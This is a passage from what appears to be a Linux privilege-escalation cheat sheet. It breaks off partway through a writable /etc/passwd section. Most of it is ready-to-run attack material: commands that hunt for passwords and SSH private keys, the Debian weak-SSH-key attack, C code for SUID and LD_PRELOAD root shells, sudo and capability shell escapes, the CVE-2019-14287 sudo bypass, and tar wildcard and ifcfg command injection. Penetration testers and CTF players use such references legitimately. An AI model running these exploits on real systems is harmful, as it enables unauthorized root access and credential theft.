<a class=anchor href=#checklists>#</a></h2><ul><li>Kernel and distribution release details</li><li>System Information:<ul><li>Hostname</li><li>Networking details:</li><li>Current IP</li><li>Default route details</li><li>DNS server information</li></ul></li><li>User Information:<ul><li>Current user details</li><li>Last logged on users</li><li>Shows users logged onto the host</li><li>List all users including uid/gid information</li><li>List root accounts</li><li>Extracts password policies and hash storage method information</li><li>Checks umask value</li><li>Checks if password hashes are stored in /etc/passwd</li><li>Extract full details for &lsquo;default&rsquo; uid&rsquo;s such as 0, 1000, 1001 etc</li><li>Attempt to read restricted files i.e. /etc/shadow</li><li>List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)</li><li>Basic SSH checks</li></ul></li><li>Privileged access:<ul><li>Which users have recently used sudo</li><li>Determine if /etc/sudoers is accessible</li><li>Determine if the current user has Sudo access without a password</li><li>Are known &lsquo;good&rsquo; breakout binaries available via Sudo (i.e. nmap, vim etc.)</li><li>Is root&rsquo;s home directory accessible</li><li>List permissions for /home/</li></ul></li><li>Environmental:<ul><li>Display current $PATH</li><li>Displays env information</li></ul></li><li>Jobs/Tasks:<ul><li>List all cron jobs</li><li>Locate all world-writable cron jobs</li><li>Locate cron jobs owned by other users of the system</li><li>List the active and inactive systemd timers</li></ul></li><li>Services:<ul><li>List network connections (TCP & UDP)</li><li>List running processes</li><li>Lookup and list process binaries and associated permissions</li><li>List inetd.conf/xined.conf contents and associated binary file permissions</li><li>List init.d binary permissions</li></ul></li><li>Version Information (of the following):<ul><li>Sudo</li><li>MYSQL</li><li>Postgres</li><li>Apache<ul><li>Checks user config</li><li>Shows enabled modules</li><li>Checks for htpasswd files</li><li>View www directories</li></ul></li></ul></li><li>Default/Weak Credentials:<ul><li>Checks for default/weak Postgres accounts</li><li>Checks for default/weak MYSQL accounts</li></ul></li><li>Searches:<ul><li>Locate all SUID/GUID files</li><li>Locate all world-writable SUID/GUID files</li><li>Locate all SUID/GUID files owned by root</li><li>Locate &lsquo;interesting&rsquo; SUID/GUID files (i.e. nmap, vim etc)</li><li>Locate files with POSIX capabilities</li><li>List all world-writable files</li><li>Find/list all accessible *.plan files and display contents</li><li>Find/list all accessible *.rhosts files and display contents</li><li>Show NFS server details</li><li>Locate *.conf and *.log files containing keyword supplied at script runtime</li><li>List all *.conf files located in /etc</li><li>Locate mail</li></ul></li><li>Platform/software specific tests:<ul><li>Checks to determine if we&rsquo;re in a Docker container</li><li>Checks to see if the host has Docker installed</li><li>Checks to determine if we&rsquo;re in an LXC container</li></ul></li></ul><h2 id=looting-for-passwords>Looting for passwords
<a class=anchor href=#looting-for-passwords>#</a></h2><h3 id=files-containing-passwords>Files containing passwords
<a class=anchor href=#files-containing-passwords>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>grep --color=auto -rnw <span style=color:#e6db74>&#39;/&#39;</span> -ie <span style=color:#e6db74>&#34;PASSWORD&#34;</span> --color=always <span style=color:#ae81ff>2</span>&gt; /dev/null
</span></span><span style=display:flex><span>find . -type f -exec grep -i -I <span style=color:#e6db74>&#34;PASSWORD&#34;</span> {} /dev/null \;
</span></span></code></pre></div><h3 id=old-passwords-in-etcsecurityopasswd>Old passwords in /etc/security/opasswd
<a class=anchor href=#old-passwords-in-etcsecurityopasswd>#</a></h3><p>The <code>/etc/security/opasswd</code> file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.</p><p>:warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes</p><h3 id=last-edited-files>Last edited files
<a class=anchor href=#last-edited-files>#</a></h3><p>Files that were edited in the last 10 minutes</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>find / -mmin <span style=color:#ae81ff>-10</span> <span style=color:#ae81ff>2</span>&gt;/dev/null | grep -Ev <span style=color:#e6db74>&#34;^/proc&#34;</span>
</span></span></code></pre></div><h3 id=in-memory-passwords>In memory passwords
<a class=anchor href=#in-memory-passwords>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>strings /dev/mem -n10 | grep -i PASS
</span></span></code></pre></div><h3 id=find-sensitive-files>Find sensitive files
<a class=anchor href=#find-sensitive-files>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ locate password | more           
</span></span><span style=display:flex><span>/boot/grub/i386-pc/password.mod
</span></span><span style=display:flex><span>/etc/pam.d/common-password
</span></span><span style=display:flex><span>/etc/pam.d/gdm-password
</span></span><span style=display:flex><span>/etc/pam.d/gdm-password.original
</span></span><span style=display:flex><span>/lib/live/config/<span style=color:#ae81ff>0031</span>-root-password
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><h2 id=ssh-key>SSH Key
<a class=anchor href=#ssh-key>#</a></h2><h3 id=sensitive-files>Sensitive files
<a class=anchor href=#sensitive-files>#</a></h3><pre tabindex=0><code>find / -name authorized_keys 2&gt; /dev/null
find / -name id_rsa 2&gt; /dev/null
...
</code></pre><h3 id=ssh-key-predictable-prng-authorized_keys-process>SSH Key Predictable PRNG (Authorized_Keys) Process
<a class=anchor href=#ssh-key-predictable-prng-authorized_keys-process>#</a></h3><p>This module describes how to attempt to use an obtained authorized_keys file on a host system.</p><p>Needed : SSH-DSS String from authorized_keys file</p><p><strong>Steps</strong></p><ol><li>Get the authorized_keys file. An example of this file would look like so:</li></ol><pre tabindex=0><code>ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... 
</code></pre><ol start=2><li>Since this is an ssh-dss key, we need to add that to our local copy of <code>/etc/ssh/ssh_config</code> and <code>/etc/ssh/sshd_config</code>:</li></ol><pre tabindex=0><code>echo &#34;PubkeyAcceptedKeyTypes=+ssh-dss&#34; &gt;&gt; /etc/ssh/ssh_config
echo &#34;PubkeyAcceptedKeyTypes=+ssh-dss&#34; &gt;&gt; /etc/ssh/sshd_config
/etc/init.d/ssh restart
</code></pre><ol start=3><li>Get <a href=https://github.com/g0tmi1k/debian-ssh>g0tmi1k&rsquo;s debian-ssh repository</a> and unpack the keys:</li></ol><pre tabindex=0><code>git clone https://github.com/g0tmi1k/debian-ssh
cd debian-ssh
tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
</code></pre><ol start=4><li>Grab the first 20 or 30 bytes from the key file shown above starting with the <code>"AAAA..."</code> portion and grep the unpacked keys with it as:</li></ol><pre tabindex=0><code>grep -lr &#39;AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf&#39;
dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
</code></pre><ol start=5><li>IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the &lsquo;.pub&rsquo; extension and do:</li></ol><pre tabindex=0><code>ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
</code></pre><p>And you should connect without requiring a password. If stuck, the <code>-vvv</code> verbosity should provide enough details as to why.</p><h2 id=scheduled-tasks>Scheduled tasks
<a class=anchor href=#scheduled-tasks>#</a></h2><h3 id=cron-jobs>Cron jobs
<a class=anchor href=#cron-jobs>#</a></h3><p>Check if you have access with write permission on these files.<br>Check inside the file, to find other paths with write permissions.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>/etc/init.d
</span></span><span style=display:flex><span>/etc/cron*
</span></span><span style=display:flex><span>/etc/crontab
</span></span><span style=display:flex><span>/etc/cron.allow
</span></span><span style=display:flex><span>/etc/cron.d 
</span></span><span style=display:flex><span>/etc/cron.deny
</span></span><span style=display:flex><span>/etc/cron.daily
</span></span><span style=display:flex><span>/etc/cron.hourly
</span></span><span style=display:flex><span>/etc/cron.monthly
</span></span><span style=display:flex><span>/etc/cron.weekly
</span></span><span style=display:flex><span>/etc/sudoers
</span></span><span style=display:flex><span>/etc/exports
</span></span><span style=display:flex><span>/etc/anacrontab
</span></span><span style=display:flex><span>/var/spool/cron
</span></span><span style=display:flex><span>/var/spool/cron/crontabs/root
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>crontab -l
</span></span><span style=display:flex><span>ls -alh /var/spool/cron;
</span></span><span style=display:flex><span>ls -al /etc/ | grep cron
</span></span><span style=display:flex><span>ls -al /etc/cron*
</span></span><span style=display:flex><span>cat /etc/cron*
</span></span><span style=display:flex><span>cat /etc/at.allow
</span></span><span style=display:flex><span>cat /etc/at.deny
</span></span><span style=display:flex><span>cat /etc/cron.allow
</span></span><span style=display:flex><span>cat /etc/cron.deny*
</span></span></code></pre></div><p>You can use <a href=https://github.com/DominicBreuker/pspy>pspy</a> to detect a CRON job.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># print both commands and file system events and scan procfs every 1000 ms (=1sec)</span>
</span></span><span style=display:flex><span>./pspy64 -pf -i <span style=color:#ae81ff>1000</span> 
</span></span></code></pre></div><h2 id=systemd-timers>Systemd timers
<a class=anchor href=#systemd-timers>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>systemctl list-timers --all
</span></span><span style=display:flex><span>NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
</span></span><span style=display:flex><span>Mon <span style=color:#ae81ff>2019</span>-<span style=color:#ae81ff>04</span>-<span style=color:#ae81ff>01</span> <span style=color:#ae81ff>02</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>59</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>14</span> CEST  15h left Sun <span style=color:#ae81ff>2019</span>-<span style=color:#ae81ff>03</span>-<span style=color:#ae81ff>31</span> <span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>52</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>49</span> CEST  24min ago          apt-daily.timer              apt-daily.service
</span></span><span style=display:flex><span>Mon <span style=color:#ae81ff>2019</span>-<span style=color:#ae81ff>04</span>-<span style=color:#ae81ff>01</span> <span style=color:#ae81ff>06</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>20</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>40</span> CEST  19h left Sun <span style=color:#ae81ff>2019</span>-<span style=color:#ae81ff>03</span>-<span style=color:#ae81ff>31</span> <span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>52</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>49</span> CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
</span></span><span style=display:flex><span>Mon <span style=color:#ae81ff>2019</span>-<span style=color:#ae81ff>04</span>-<span style=color:#ae81ff>01</span> <span style=color:#ae81ff>07</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>36</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>10</span> CEST  20h left Sat <span style=color:#ae81ff>2019</span>-<span style=color:#ae81ff>03</span>-<span style=color:#ae81ff>09</span> <span style=color:#ae81ff>14</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>28</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>25</span> CET   <span style=color:#ae81ff>3</span> weeks <span style=color:#ae81ff>0</span> days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>3</span> timers listed.
</span></span></code></pre></div><h2 id=suid>SUID
<a class=anchor href=#suid>#</a></h2><p>SUID/Setuid stands for &ldquo;set user ID upon execution&rdquo;, it is enabled by default in every Linux distributions. If a file with this bit is ran, the uid will be changed by the owner one. If the file owner is <code>root</code>, the uid will be changed to <code>root</code> even if it was executed from user <code>bob</code>. SUID bit is represented by an <code>s</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>╭─</span>swissky@lab ~  
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>╰─</span>$ ls /usr/bin/sudo -alh                  
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 138K <span style=color:#ae81ff>23</span> nov.  <span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>04</span> /usr/bin/sudo
</span></span></code></pre></div><h3 id=find-suid-binaries>Find SUID binaries
<a class=anchor href=#find-suid-binaries>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find / -perm -4000 -type f -exec ls -la <span style=color:#f92672>{}</span> 2&gt;/dev/null <span style=color:#ae81ff>\;</span>
</span></span><span style=display:flex><span>find / -uid <span style=color:#ae81ff>0</span> -perm -4000 -type f 2&gt;/dev/null
</span></span></code></pre></div><h3 id=create-a-suid-binary>Create a SUID binary
<a class=anchor href=#create-a-suid-binary>#</a></h3><table><thead><tr><th>Function</th><th>Description</th></tr></thead><tbody><tr><td>setreuid()</td><td>sets real and effective user IDs of the calling process</td></tr><tr><td>setuid()</td><td>sets the effective user ID of the calling process</td></tr><tr><td>setgid()</td><td>sets the effective group ID of the calling process</td></tr></tbody></table><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>print <span style=color:#e6db74>&#39;int main(void){\nsetresuid(0, 0, 0);\nsystem(&#34;/bin/sh&#34;);\n}&#39;</span> &gt; /tmp/suid.c   
</span></span><span style=display:flex><span>gcc -o /tmp/suid /tmp/suid.c  
</span></span><span style=display:flex><span>sudo chmod +x /tmp/suid <span style=color:#75715e># execute right</span>
</span></span><span style=display:flex><span>sudo chmod +s /tmp/suid <span style=color:#75715e># setuid bit</span>
</span></span></code></pre></div><h2 id=capabilities>Capabilities
<a class=anchor href=#capabilities>#</a></h2><h3 id=list-capabilities-of-binaries>List capabilities of binaries
<a class=anchor href=#list-capabilities-of-binaries>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>╭─</span>swissky@lab ~  
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>╰─</span>$ /usr/bin/getcap -r  /usr/bin
</span></span><span style=display:flex><span>/usr/bin/fping                = cap_net_raw+ep
</span></span><span style=display:flex><span>/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
</span></span><span style=display:flex><span>/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
</span></span><span style=display:flex><span>/usr/bin/rlogin               = cap_net_bind_service+ep
</span></span><span style=display:flex><span>/usr/bin/ping                 = cap_net_raw+ep
</span></span><span style=display:flex><span>/usr/bin/rsh                  = cap_net_bind_service+ep
</span></span><span style=display:flex><span>/usr/bin/rcp                  = cap_net_bind_service+ep
</span></span></code></pre></div><h3 id=edit-capabilities>Edit capabilities
<a class=anchor href=#edit-capabilities>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>/usr/bin/setcap -r /bin/ping            <span style=color:#75715e># remove</span>
</span></span><span style=display:flex><span>/usr/bin/setcap cap_net_raw+p /bin/ping <span style=color:#75715e># add</span>
</span></span></code></pre></div><h3 id=interesting-capabilities>Interesting capabilities
<a class=anchor href=#interesting-capabilities>#</a></h3><p>Having the capability =ep means the binary has all the capabilities.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ getcap openssl /usr/bin/openssl 
</span></span><span style=display:flex><span>openssl=ep
</span></span></code></pre></div><p>Alternatively the following capabilities can be used in order to upgrade your current privileges.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>cap_dac_read_search <span style=color:#75715e># read anything</span>
</span></span><span style=display:flex><span>cap_setuid+ep <span style=color:#75715e># setuid</span>
</span></span></code></pre></div><p>Example of privilege escalation with <code>cap_setuid+ep</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ python2.7 -c <span style=color:#e6db74>&#39;import os; os.setuid(0); os.system(&#34;/bin/sh&#34;)&#39;</span>
</span></span><span style=display:flex><span>sh-<span style=color:#ae81ff>5.0</span><span style=color:#75715e># id</span>
</span></span><span style=display:flex><span>uid=<span style=color:#ae81ff>0</span>(root) gid=<span style=color:#ae81ff>1000</span>(swissky)
</span></span></code></pre></div><table><thead><tr><th>Capabilities name</th><th>Description</th></tr></thead><tbody><tr><td>CAP_AUDIT_CONTROL</td><td>Allow to enable/disable kernel auditing</td></tr><tr><td>CAP_AUDIT_WRITE</td><td>Helps to write records to kernel auditing log</td></tr><tr><td>CAP_BLOCK_SUSPEND</td><td>This feature can block system suspends</td></tr><tr><td>CAP_CHOWN</td><td>Allow user to make arbitrary change to files UIDs and GIDs</td></tr><tr><td>CAP_DAC_OVERRIDE</td><td>This helps to bypass file read, write and execute permission checks</td></tr><tr><td>CAP_DAC_READ_SEARCH</td><td>This only bypass file and directory read/execute permission checks</td></tr><tr><td>CAP_FOWNER</td><td>This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file</td></tr><tr><td>CAP_KILL</td><td>Allow the sending of signals to processes belonging to others</td></tr><tr><td>CAP_SETGID</td><td>Allow changing of the GID</td></tr><tr><td>CAP_SETUID</td><td>Allow changing of the UID</td></tr><tr><td>CAP_SETPCAP</td><td>Helps to transferring and removal of current set to any PID</td></tr><tr><td>CAP_IPC_LOCK</td><td>This helps to lock memory</td></tr><tr><td>CAP_MAC_ADMIN</td><td>Allow MAC configuration or state changes</td></tr><tr><td>CAP_NET_RAW</td><td>Use RAW and PACKET sockets</td></tr><tr><td>CAP_NET_BIND_SERVICE</td><td>SERVICE Bind a socket to internet domain privileged ports</td></tr></tbody></table><h2 id=sudo>SUDO
<a class=anchor href=#sudo>#</a></h2><p>Tool: <a href=https://github.com/TH3xACE/SUDO_KILLER>Sudo Exploitation</a></p><h3 id=nopasswd>NOPASSWD
<a class=anchor href=#nopasswd>#</a></h3><p>Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo -l
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User demo may run the following commands on crashlab:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/vim
</span></span></code></pre></div><p>In this example the user <code>demo</code> can run <code>vim</code> as <code>root</code>, it is now trivial to get a shell by adding an ssh key into the root directory or by calling <code>sh</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo vim -c <span style=color:#e6db74>&#39;!sh&#39;</span>
</span></span><span style=display:flex><span>sudo -u root vim -c <span style=color:#e6db74>&#39;!sh&#39;</span>
</span></span></code></pre></div><h3 id=ld_preload-and-nopasswd>LD_PRELOAD and NOPASSWD
<a class=anchor href=#ld_preload-and-nopasswd>#</a></h3><p>If <code>LD_PRELOAD</code> is explicitly defined in the sudoers file</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Defaults        env_keep += LD_PRELOAD
</span></span></code></pre></div><p>Compile the following shared object using the C code below with <code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>_init</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>unsetenv</span>(<span style=color:#e6db74>&#34;LD_PRELOAD&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>setgid</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>setuid</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Execute any binary with the LD_PRELOAD to spawn a shell : <code>sudo LD_PRELOAD=&lt;full_path_to_so_file> &lt;program></code>, e.g: <code>sudo LD_PRELOAD=/tmp/shell.so find</code></p><h3 id=doas>Doas
<a class=anchor href=#doas>#</a></h3><p>There are some alternatives to the <code>sudo</code> binary such as <code>doas</code> for OpenBSD, remember to check its configuration at <code>/etc/doas.conf</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>permit nopass demo as root cmd vim
</span></span></code></pre></div><h3 id=sudo_inject>sudo_inject
<a class=anchor href=#sudo_inject>#</a></h3><p>Using <a href=https://github.com/nongiach/sudo_inject>https://github.com/nongiach/sudo_inject</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ sudo whatever
</span></span><span style=display:flex><span>[<span style=color:#66d9ef>sudo</span>] password <span style=color:#66d9ef>for</span> user<span style=color:#960050;background-color:#1e0010>:</span>    
</span></span><span style=display:flex><span><span style=color:#75715e># Press &lt;ctrl&gt;+c since you don&#39;t have the password. </span>
</span></span><span style=display:flex><span><span style=color:#75715e># This creates an invalid sudo tokens.</span>
</span></span><span style=display:flex><span>$ sh exploit.sh
</span></span><span style=display:flex><span>.... wait <span style=color:#ae81ff>1</span> seconds
</span></span><span style=display:flex><span>$ sudo -i <span style=color:#75715e># no password required :)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># id</span>
</span></span><span style=display:flex><span>uid=<span style=color:#ae81ff>0</span>(root) gid=<span style=color:#ae81ff>0</span>(root) groups=<span style=color:#ae81ff>0</span>(root)
</span></span></code></pre></div><p>Slides of the presentation : <a href=https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf>https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf</a></p><h3 id=cve-2019-14287>CVE-2019-14287
<a class=anchor href=#cve-2019-14287>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># Exploitable when a user have the following permissions (sudo -l)</span>
</span></span><span style=display:flex><span>(ALL, !root) ALL
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># If you have a full TTY, you can exploit it like this</span>
</span></span><span style=display:flex><span>sudo -u<span style=color:#75715e>#-1 /bin/bash</span>
</span></span><span style=display:flex><span>sudo -u<span style=color:#75715e>#4294967295 id</span>
</span></span></code></pre></div><h2 id=gtfobins>GTFOBins
<a class=anchor href=#gtfobins>#</a></h2><p><a href=https://gtfobins.github.io>GTFOBins</a> is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p><p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p><blockquote><p>gdb -nx -ex &lsquo;!sh&rsquo; -ex quit<br>sudo mysql -e &lsquo;! /bin/sh&rsquo;<br>strace -o /dev/null /bin/sh<br>sudo awk &lsquo;BEGIN {system("/bin/sh")}&rsquo;</p></blockquote><h2 id=wildcard>Wildcard
<a class=anchor href=#wildcard>#</a></h2><p>By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that&rsquo;s where the wildcard comes in handy.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># create file for exploitation</span>
</span></span><span style=display:flex><span>touch -- <span style=color:#e6db74>&#34;--checkpoint=1&#34;</span>
</span></span><span style=display:flex><span>touch -- <span style=color:#e6db74>&#34;--checkpoint-action=exec=sh shell.sh&#34;</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;#\!/bin/bash\ncat /etc/passwd &gt; /tmp/flag\nchmod 777 /tmp/flag&#34;</span> &gt; shell.sh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># vulnerable script</span>
</span></span><span style=display:flex><span>tar cf archive.tar *
</span></span></code></pre></div><p>Tool: <a href=https://github.com/localh0t/wildpwn>wildpwn</a></p><h2 id=writable-files>Writable files
<a class=anchor href=#writable-files>#</a></h2><p>List world writable files on the system.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>find / -writable ! -user `whoami` -type f ! -path <span style=color:#e6db74>&#34;/proc/*&#34;</span> ! -path <span style=color:#e6db74>&#34;/sys/*&#34;</span> -exec ls -al {} \; <span style=color:#ae81ff>2</span>&gt;/dev/null
</span></span><span style=display:flex><span>find / -perm <span style=color:#ae81ff>-2</span> -type f <span style=color:#ae81ff>2</span>&gt;/dev/null
</span></span><span style=display:flex><span>find / ! -path <span style=color:#e6db74>&#34;*/proc/*&#34;</span> -perm <span style=color:#ae81ff>-2</span> -type f -print <span style=color:#ae81ff>2</span>&gt;/dev/null
</span></span></code></pre></div><h3 id=writable-etcsysconfignetwork-scripts-centosredhat>Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)
<a class=anchor href=#writable-etcsysconfignetwork-scripts-centosredhat>#</a></h3><p>/etc/sysconfig/network-scripts/ifcfg-1337 for example</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>NAME=Network /bin/id  &amp;lt;= Note the blank space
</span></span><span style=display:flex><span>ONBOOT=yes
</span></span><span style=display:flex><span>DEVICE=eth0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>EXEC <span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>./etc/sysconfig/network-scripts/ifcfg-<span style=color:#ae81ff>1337</span>
</span></span></code></pre></div><p>src : <a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f">https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</a></p><h3 id=writable-etcpasswd>Writable /etc/passwd
<a class=anchor href=#writable-etcpasswd>#</a></h3><p>First generate a password with one of the following commands.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>openssl passwd <span style=color:#ae81ff>-1</span> -salt hacker hacker
